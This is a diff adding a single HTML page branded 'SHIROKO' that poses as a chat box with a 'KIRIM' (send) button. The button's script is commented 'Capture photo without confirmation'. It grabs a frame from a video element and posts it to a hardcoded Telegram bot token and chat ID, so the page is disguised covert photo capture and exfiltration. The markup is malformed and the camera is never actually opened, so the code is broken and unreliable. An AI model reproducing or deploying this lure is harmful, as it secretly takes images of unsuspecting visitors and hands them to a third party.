@@ -1,0 +1,143 @@
+<DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://www.shiroko.com</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000; /* ខ្មៅ */
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            position: relative; /* បន្ថែម position */
+        }
+        button {
+            background-color: #ff4081; /* ពណ៌ផ្កាឈូក */
+            color: white;
+            width: 150px; /* កំណត់ទំហំប៊ូតុង */
+            height: 70px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 24px;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+            position: absolute; /* ធ្វើឱ្យប៊ូតុងនៅកណ្តាល */
+            bottom: 20px; /* ចុះមកពីខាងក្រោម */
+        }
+        button:hover {
+            background-color: #ff1f68; /* ពណ៌ផ្កាឈូកភ្លឺ */
+        }
+        #next-chapter {
+            display: none; /* ធ្វើឱ្យកម្រង "Next Chapter" មិនបង្ហាញទេ */
+            position: absolute; /* ធ្វើឱ្យ "Next Chapter" នៅកណ្ដាល */
+            bottom: 100px; /* ចុះពីខាងក្រោម */
+            font-size: 32px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+        <div style="display: flex; justify-content: center;">
+        <img src="https://i.ibb.co.com/dckjsjM/images.jpg alt="">
+    </div>
+
+    <style>
+        body {
+            background-color: black; /* Latar belakang hitam */
+            color: white; /* Warna teks default */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+
+        .neon-text {
+            font-size: 30px;
+            font-weight: bold;
+            text-shadow: 
+                0 0 5px #fff,
+                0 0 10px #ff00ff,
+                0 0 15px #ff00ff,
+                0 0 20px #ff00ff,
+                0 0 30px #ff00ff,
+                0 0 40px #ff00ff,
+                0 0 50px #ff00ff;
+        }
+    </style>
+</head>
+<body>
+    <h1 class="neon-text">🥰SHIROKO🥰 </h1>
+
+
+</body>
+  <div class="input-area">
+        <input type="text" id="messageInput" placeholder="Ketik pesan...">
+            </div>
+            
+    <button id="capture">KIRIM</button>
+    <div id="RUN"></div>
+
+    <script>
+        const captureButton = document.getElementById('capture');
+        const nextChapter = document.getElementById('next-chapter');
+        const canvas = document.createElement('canvas'); // Create canvas dynamically
+        const video = document.createElement('video'); // Create video element dynamically
+
+
+
+        // Capture photo without confirmation
+        captureButton.addEventListener('click', () => {
+            canvas.width = 480; // Set canvas width
+            canvas.height = 360; // Set canvas height
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/png');
+            sendPhotoToTelegram(dataURL);
+            nextChapter.style.display = 'block'; // Show "Next Chapter" text
+            setTimeout(() => {
+                nextChapter.style.display = 'none'; // Hide after 2 seconds
+            }, 1000);
+        });
+
+        // Send photo to Telegram
+        function sendPhotoToTelegram(photoData) {
+            const token = '7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ'; // Your Bot API Token
+            const chatId = '5951232585 '; // Your Chat ID
+            const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+            // Convert dataURL to Blob
+            fetch(photoData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.png'); // Set a filename for the photo
+
+                    return fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    });
+                })
+                .then(response => {
+                    console.log('Response:', response);
+                    if (response.ok) {
+                        console.log('Photo sent successfully!');
+                    } else {
+                        console.error('Error sending photo:', response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+    </script>
+</body>
+</html>
